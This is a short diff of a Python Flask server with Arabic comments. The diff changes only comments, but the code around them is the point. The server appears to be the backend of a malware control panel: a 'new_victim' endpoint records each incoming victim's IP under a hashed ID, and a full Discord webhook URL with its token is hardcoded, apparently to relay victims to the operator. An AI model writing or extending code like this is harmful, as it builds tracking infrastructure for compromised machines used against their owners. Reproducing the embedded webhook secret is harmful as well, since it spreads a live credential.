@@ -4,7 +4,7 @@ import requests, json, time, os, hashlib
 app = Flask(__name__)
 
 # ==========================================
-# الويب هوك الجديد حقك
+# الويب هوك حقك
 WEBHOOK_URL = "https://discord.com/api/webhooks/1561247907213086720/uM2sBufoeaXJvnyL3kJoe8eJLcaJ5nCfJ1elh0QIodJChuQHE9PFEmJ7Dy7zFMfm0-eo"
 # ==========================================
 
@@ -16,7 +16,7 @@ def new_victim():
     data = request.json
     ip = data.get('ip', 'unknown')
     
-    # توليد ID ثابت بناءً على الـ IP (عشان ما يتغير لو السيرفر نام)
+    # توليد ID ثابت بناءً على الـ IP
     vid = hashlib.md5(ip.encode()).hexdigest()[:4]
     
     VICTIMS[vid] = {"id": vid, "ip": ip, "time": time.ctime()}
